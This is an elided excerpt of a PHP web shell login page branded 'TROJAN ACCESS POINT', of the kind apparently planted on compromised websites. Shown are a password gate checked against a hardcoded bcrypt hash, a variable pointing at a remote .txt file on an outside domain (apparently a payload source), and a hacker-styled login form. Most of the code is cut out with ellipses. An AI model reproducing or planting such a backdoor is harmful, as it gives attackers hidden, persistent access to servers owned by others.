...
if (is_logged_in()) {
    ...
    $destiny = 'https://dashboard.expressbpd.in/css/globalhell.txt';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2a$12$7/HeGhejRWiHdE5GZUh6reUg95UFgmniAnF0uLzl9BGp9xCc5t5qS';
...
<head>
    ...
    <title>TROJAN LINK ACCESS</title>
...
<body>
    ...
    <div class="login-container" id="loginContainer">
        ...
        <div class="security-level">
            TROJAN FIREWALL ACTIVE
        </div>

        <!-- Header -->
        <div class="login-header">
            <div class="logo">◢ TROJAN ◣</div>
            <div class="subtitle">TROJAN ACCESS POINT</div>
        </div>

        <!-- Terminal Simulation -->
        <div class="terminal-line">> Initializing secure connection...</div>
        <div class="terminal-line">> Quantum encryption enabled</div>
        <div class="terminal-line">> Awaiting trojan authorization...</div>

        <!-- Login Form -->
        <form id="loginForm" method="POST" action="">
            <div class="form-group">
                <label class="form-label">
                    <i class="fas fa-user-secret"></i> Trojan ID
                </label>
            ...
            <button type="submit" class="hack-button">
                <i class="fas fa-brain"></i> INITIATE TROJAN LINK
            </button>
        </form>
        ...
        <div class="status-bar">
            ...
            <div class="loading" id="loading">
                ...
                Establishing trojan connection...
            </div>
        </div>
    </div>
